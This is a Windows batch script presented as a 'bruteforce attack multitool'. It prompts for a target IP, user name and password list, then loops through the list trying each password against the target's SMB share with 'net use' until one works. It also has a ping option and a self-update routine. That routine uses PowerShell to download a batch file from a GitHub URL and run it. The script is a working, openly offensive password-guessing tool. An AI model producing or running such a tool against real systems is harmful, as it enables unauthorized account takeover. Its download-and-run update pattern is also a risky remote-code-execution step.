@echo off
title BRUTEFORCE ATTACK MULTITOOL
setlocal 

call :MAIN_MENU

:MAIN_MENU
color 02

echo  _____      _____             __             ___       _____       ___

echo |     \    /     |           /  \           |   |     |     \     |   |

echo |      \  /      |          /    \          |   |     |      \    |   |

echo |       \/       |         /      \         |   |     |    _  \   |   |

echo |    |\    /|    |        /   __   \        |   |     |   | \  \  |   |

echo |    | \__/ |    |       /   /  \   \       |   |     |   |  \  \ |   |

echo |    |      |    |      /   /    \   \      |   |     |   |   \  \|   |

echo |____|      |____|     /___/      \___\     |___|     |___|    \______|

echo                   _____      _____       _____________       _____        ___      ____      ____ 

echo                  |     \    /     |     |    _________|     |     \      |   |    |    |    |    |

echo                  |      \  /      |     |    |              |      \     |   |    |    |    |    |

echo                  |       \/       |     |    |              |       \    |   |    |    |    |    |

echo                  |                |     |    |______        |    _   \   |   |    |    |    |    |

echo                  |    |\    /|    |     |     ______|       |   | \   \  |   |    |    |    |    |

echo                  |    | \__/ |    |     |    |              |   |  \   \ |   |    |    \____/    |

echo                  |    |      |    |     |    |________      |   |   \   \|   |    \              /

echo                  |____|      |____|     |_____________|     |___|    \_______|     \____________/

echo press any key to continue

color 07 
pause > nul
cls 
echo SETTINGS
call :SETTINGS

:SETTINGS
color 0F
echo press 1. to collect data 
color 07
echo press 2. to ping collected data
echo press 3. to BRUTEFORCE attack on the collected data
echo press 4. to see future features
echo press 5. to check updates  
echo search for target (NOT AVAIABLE)
time /s 3
set /p "WHAT_TO_DO=EXECUTE: "
if "%WHAT_TO_DO%" == "1" (
  call :COLLECT_DATA
) else if "%WHAT_TO_DO%" == "2" (
  call :PING
) else if "%WHAT_TO_DO%" == "3" (
  call :BRUTEFORCE
) else if "%WHAT_TO_DO%" == "4" (
  echo "more bugs :)"
  echo "in .sh for linux"
  echo "better ASCII art in this brute force script"
  echo ".exe file for this and more"
) else if "%WHAT_TO_DO%" == "5" (
  call :update
) else (
  echo ERROR SOMETING WENT WRONG !!! 
  goto :MAIN_MENU
)

:COLLECT_DATA
set /p "IP=ENTER target IP: "
set /p "USER=ENTER target user name:"
set /p "DATA_LIST=ENTER password list name:"
REM DO NOT CHANGE REALLY I AM NOT JOIKING
set "VERSION=0.0"
REM I THINK IT REALLY

:PING
set /p "IP=Enter IP Address to Ping: "
ping %IP%
if errorlevel 1 ( 
    echo Failed to ping %IP%.
) else ( 
    echo %IP% is reachable.
)
pause
goto :MAIN_MENU

:BRUTEFORCE
cls
echo Starting BRUTEFORCE attack...
set /a count=1
for /f %%a in (%DATA_LIST%) do (
  set pass=%%a
  call :attempt
)
echo Password not found.
pause
goto :MAIN_MENU

:attempt
net use \\%IP% /user:%USER% %pass% >nul 2>&1
if %errorlevel% EQU 0 (
  echo Password Found: %pass%
  net use \\%IP% /d /y >nul 2>&1
  pause
  goto :MAIN_MENU
) else (
  echo [ATTEMPT %count%] [%pass%]
  set /a count+=1
)
goto :eof

:update
REM Check for updates
echo Checking for updates...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/True100-True/chainsawHacker/main/brute_force_attack.bat', 'temp_update.bat')"
if errorlevel 1 (
    echo Failed to check for updates.
    goto :MAIN_MENU
)

REM Compare versions
for /f "usebackq tokens=2 delims=:" %%a in (`findstr /r /c:"set \"VERSION=" temp_update.bat 2^>nul"`) do set "REMOTE_VERSION=%%a"
set "REMOTE_VERSION=%REMOTE_VERSION:~1%"
call :CompareVersions %REMOTE_VERSION% %VERSION%
if %COMP_RESULT% equ 1 (
    echo Update available! Downloading...
    move /y temp_update.bat brute_force_attack.bat
    echo Update applied. Restarting script...
    start "" cmd /c "brute_force_attack.bat"
    exit /b
) else (
    echo Script is up to date.
    goto :MAIN_MENU
)

:CompareVersions
setlocal enabledelayedexpansion
set "V1=%~1"
set "V2=%~2"
for /f "tokens=1-3 delims=." %%a in ("%V1%") do (
    set "V1_MAJ=%%a"
    set "V1_MIN=%%b"
    set "V1_REV=%%c"
)
for /f "tokens=1-3 delims=." %%a in ("%V2%") do (
    set "V2_MAJ=%%a"
    set "V2_MIN=%%b"
    set "V2_REV=%%c"
)
if %V1_MAJ% gtr %V2_MAJ% (
    set "COMP_RESULT=1"
    goto :eof
) else if %V1_MAJ% lss %V2_MAJ% (
    set "COMP_RESULT=-1"
    goto :eof
) else (
    if %V1_MIN% gtr %V2_MIN% (
        set "COMP_RESULT=1"
        goto :eof
    ) else if %V1_MIN% lss %V2_MIN% (
        set "COMP_RESULT=-1"
        goto :eof
    ) else (
        if %V1_REV% gtr %V2_REV% (
            set "COMP_RESULT=1"
            goto :eof
        ) else if %V1_REV% lss %V2_REV% (
            set "COMP_RESULT=-1"
            goto :eof
        ) else (
            set "COMP_RESULT=0"
            goto :eof
        )
    )
)
